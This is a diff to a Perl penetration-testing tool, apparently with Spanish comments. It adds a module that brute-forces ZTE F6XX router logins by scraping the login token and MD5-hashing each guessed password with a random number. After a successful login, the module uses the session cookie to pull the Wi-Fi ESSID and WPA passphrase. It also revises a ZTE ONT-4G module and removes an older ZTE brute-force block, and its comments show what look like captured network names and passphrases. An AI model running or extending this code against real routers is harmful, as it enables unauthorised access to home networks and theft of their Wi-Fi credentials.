@@ -18,7 +18,7 @@ use Parallel::ForkManager;
 use Term::ANSIColor;
 use utf8;
 use Text::Unidecode;
-
+use Digest::MD5 qw(md5_hex);
 binmode STDOUT, ":encoding(UTF-8)";
 
 
@@ -566,34 +566,43 @@ if ($module eq "zimbraXXE")
 }
 
 
+
+sub obtener_hash_md5 {
+    my ($cadena) = @_;
+    my $hash_md5 = md5_hex($cadena);
+    return $hash_md5;
+}
+
+
 sub passwordTest
 {
-my $self = shift;
-my $headers = $self->headers;
-my $debug = $self->debug;
-my $rhost = $self->rhost;
-my $rport = $self->rport;
-my $proto = $self->proto;
+	my $self = shift;
+	my $headers = $self->headers;
+	my $debug = $self->debug;
+	my $rhost = $self->rhost;
+	my $rport = $self->rport;
+	my $proto = $self->proto;
 
-my %options = @_;
-my $module = $options{ module };
-my $passwords_file = $options{ passwords_file };
-my $password = $options{ password };
-my $user = $options{ user };
-my $path = $options{ path };
+	my %options = @_;
+	my $module = $options{ module };
+	my $passwords_file = $options{ passwords_file };
+	my $password = $options{ password };
+	my $user = $options{ user };
+	my $path = $options{ path };
 
 
-print color('bold blue') if($debug);
-print "######### Testendo: $module ##################### \n\n" if($debug);
-print color('reset') if($debug);
+	print color('bold blue') if($debug);
+	print "######### Testendo: $module ##################### \n\n" if($debug);
+	print color('reset') if($debug);
 
-my $url ;
-if ($rport eq '80' || $rport eq '443')
-	{$url = "$proto://".$rhost.$path; }
-else
-	{$url = "$proto://".$rhost.":".$rport.$path; }
+	my $url ;
+	if ($rport eq '80' || $rport eq '443')
+		{$url = "$proto://".$rhost.$path; }
+	else
+		{$url = "$proto://".$rhost.":".$rport.$path; }
         
-	if ($module eq "ONT-4GE-2VW")
+	############### ZTE-ONT-4G
+	if ($module eq "ZTE-ONT-4G")
 	{
 
 		$headers->header("Origin" => $url);
@@ -650,12 +659,10 @@ else
 				$decoded_response =~ s/[^\x00-\x7f]//g;
 				$decoded_response =~ s/\\x2e/./g; 
 				$decoded_response =~ s/\\x20/ /g; 
-
-				# print("imprmit");
-				# open (SALIDA,">iot.html") || die "ERROR: No puedo abrir el fichero google.html\n";
-				# print SALIDA $decoded_response;
-				# close (SALIDA);
-
+				$decoded_response =~ s/\\x5f/_/g; 
+				$decoded_response =~ s/\\x2d/-/g; 
+				$decoded_response =~ s/\\x22/"/g; 
+			
 				my $KeyPassphrase;
 				#KeyPassphrase','675430or'
 				if ($decoded_response =~ /Transfer_meaning\('KeyPassphrase','(\w+)'\);/) {
@@ -668,12 +675,119 @@ else
 					$ESSID = $1;				
 				}
 			
-				print "Password encontrado: [ZTE ONT-4GE-2VW] $url Usuario:$user Password:$password ESSID $ESSID KeyPassphrase $KeyPassphrase \n";
+				print "Password encontrado: [ZTE ZTE-ONT-4G] $url Usuario:$user Password:$password ESSID $ESSID KeyPassphrase $KeyPassphrase \n";
 				last;											
 			}	
 		}				
 		close MYINPUT;	
-	}#ZKSoftware
+	}#ZTE ONT-4G 
+
+
+	############### ZTE-F6XX
+	if ($module eq "ZTE-F6XX")
+	{		
+		$headers->header("Referer" => $url);
+		$headers->header("Upgrade-Insecure-Requests" => 1);
+		$headers->header("Cookie" => '_TESTCOOKIESUPPORT=1');
+			
+
+		my @passwords_list = []; 
+		if ($passwords_file ne '' )
+		{
+			print "Archivo password";
+			open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
+			while (my $password=<MYINPUT>)
+			{ 						
+				push @passwords_list,$password; 
+			}
+		}
+		else
+		{
+			@passwords_list[0]=$password; 
+		}
+		
+		
+		foreach my $password (@passwords_list) 
+		{
+			$password =~ s/\n//g; 	
+						
+			my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
+			my $decoded_response = $response->decoded_content;
+			#getObj("Frm_Logintoken").value = "12";
+			$decoded_response =~ /getObj\("Frm_Logintoken"\).value = "(.*?)"/;
+
+
+			my $Frm_Logintoken = $1; 			
+			my $random_number = int(rand(89999999)) + 10000000;			
+			$password =~ s/\n//g; 	
+			my $hash_md5 = obtener_hash_md5($password.$random_number);
+			print ("Frm_Logintoken $Frm_Logintoken  random_number $random_number hash_md5 $hash_md5");
+			my $hash_data = {"frashnum" => "",
+							"action" => "login",
+							"Frm_Logintoken" => $Frm_Logintoken,
+							"UserRandomNum" => $random_number,
+							'Username' => $user, 
+							'Password' => $hash_md5
+					};	
+
+			my $post_data = convert_hash($hash_data);
+			
+			$response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
+			$decoded_response = $response->decoded_content;
+			my $status = $response->status_line;						
+			print "[+] user:$user password:$password status:$status\n";
+			#print($decoded_response);
+			if ($status =~ /302/m)
+			{	
+				#Set-Cookie: SID=329c435cd6a1b00febc2f785cf7b76f9; PATH=/; HttpOnly
+				my $response_headers = $response->headers_as_string;
+				my $SID;
+				if ($response_headers =~ /SID=([^;]+)/) {
+					$SID = $1;					
+				} 
+				
+				#get SSID
+				$headers->header("Origin" => $url);	
+				$headers->header("Cookie" => "_TESTCOOKIESUPPORT=1; SID=$SID");	
+				$response = $self->dispatch(url => $url.'getpage.gch?pid=1002&nextpage=net_wlanm_essid1_t.gch' ,method => 'GET', headers => $headers);
+				$decoded_response = $response->decoded_content;	
+				$decoded_response =~ s/Transfer_meaning\('ESSID',''//g;
+				$decoded_response =~ s/,''/,'0'/g;
+				$decoded_response =~ s/[^\x00-\x7f]//g;
+				$decoded_response =~ s/\\x2e/./g; 
+				$decoded_response =~ s/\\x20/ /g; 
+				$decoded_response =~ s/\\x5f/_/g; 
+				$decoded_response =~ s/\\x2d/-/g; 
+				$decoded_response =~ s/\\x22/"/g; 
+
+				#<script language=javascript>Transfer_meaning('ESSID','JACKBAUTISTA');</script>
+				my $ESSID;
+				$decoded_response =~ /Transfer_meaning\('ESSID','(\w+)'\);/;
+				$ESSID = $1;					
+			
+				#get password
+				$response = $self->dispatch(url => $url.'getpage.gch?pid=1002&nextpage=net_wlanm_secrity1_t.gch' ,method => 'GET', headers => $headers);								
+				$decoded_response = $response->decoded_content;
+				$decoded_response =~ s/Transfer_meaning\('KeyPassphrase',''//g;
+				$decoded_response =~ s/[^\x00-\x7f]//g;
+				$decoded_response =~ s/\\x2e/./g; 
+				$decoded_response =~ s/\\x20/ /g; 
+				$decoded_response =~ s/\\x5f/_/g; 
+				$decoded_response =~ s/\\x2d/-/g; 
+				$decoded_response =~ s/\\x22/"/g; 
+				
+				#<script language=javascript>Transfer_meaning('KeyPassphrase','coins0591JB');</script>
+				$decoded_response =~ /Transfer_meaning\('KeyPassphrase','(\w+)'\);/;
+				my $KeyPassphrase = $1; 									
+			
+				print "Password encontrado: [ZTE F6XX] $url Usuario:$user Password:$password ESSID $ESSID KeyPassphrase $KeyPassphrase \n";
+				last;											
+			}
+		}				
+		close MYINPUT;	
+	}#ZTE-F6XX 
+
+	
 
 	if ($module eq "ZKSoftware")
 	{
@@ -816,56 +930,6 @@ else
 	}#zimbra
 
 
-	#ZTE
-	if ($module eq "zte")
-	{
-				
-		open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
-		while (my $password=<MYINPUT>)
-		{ 
-		
-			$headers->header("Content-Type" => "application/x-www-form-urlencoded");
-			$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");		
-			$headers->header("Cookie" => "_TESTCOOKIESUPPORT=1");		
-			
-			my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
-			my $decoded_response = $response->decoded_content;
-			$decoded_response =~ s/"//g; 
-			$decoded_response =~ s/\)//g; 
-			my $status = $response->status_line;
-		
-
-			#getObj(Frm_Logintoken.value = 8;;
-			$decoded_response =~ /Frm_Logintoken.value = (.*?);/;
-			my $Frm_Logintoken = $1; 
-					
-			
-			$password =~ s/\n//g; 	
-			my $hash_data = {"frashnum" => "",
-							"action" => "login",
-							"Frm_Logintoken" => $Frm_Logintoken,
-							'Username' => $user, 
-							'Password' => $password
-					};	
-		
-
-			my $post_data = convert_hash($hash_data);
-			
-			$response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
-			$decoded_response = $response->decoded_content;
-			$status = $response->status_line;
-			
-			print "[+] user:$user password:$password status:$status\n";
-			if ($status =~ /302/m)
-			{				 
-				print "Password encontrado: [ZTE] $url (Usuario:$user Password:$password)\n";
-				last;
-											
-			}	
-			
-		}
-		close MYINPUT;	
-	}
 
 	# pentaho
 	if ($module eq "pentaho")
